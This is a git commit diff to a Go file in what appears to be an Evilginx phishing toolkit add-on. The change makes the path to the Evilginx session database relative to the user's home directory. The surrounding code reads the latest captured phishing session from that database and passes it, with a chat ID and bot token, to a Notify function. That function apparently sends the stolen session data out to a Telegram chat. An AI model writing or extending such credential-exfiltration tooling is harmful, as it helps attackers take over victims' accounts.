c8f37e84fb21b9f947587c6a168ffff356558a38
jamiestubb <163948058+jamiestubb@users.noreply.github.com>
2025-03-06 03:35:12 -0500

    Update tsession.go
    - home user db file path

--- core/tsession.go
+++ core/tsession.go
@@ -80,8 +80,13 @@ func ReadLatestSession(filePath string) (TSession, error) {
 }
 
 func readFile(chatid string, teletoken string) {
+	homeDir, err := os.UserHomeDir()
+	if err != nil {
+		fmt.Printf("Error getting user home directory: %v\n", err)
+		return
+	}
 
-	filePath := "/root/.evilginx/data.db"
+	filePath := homeDir + "/.evilginx/data.db"
 
 	latestSession, err := ReadLatestSession(filePath)
 	if err != nil {
@@ -90,9 +95,9 @@ func readFile(chatid string, teletoken string) {
 	}
 
 	if latestSession.ID != 0 { // Assuming ID 0 indicates no valid session
-
 		Notify(latestSession, chatid, teletoken)
 	} else {
 		fmt.Println("No session found.")
 	}
 }
+
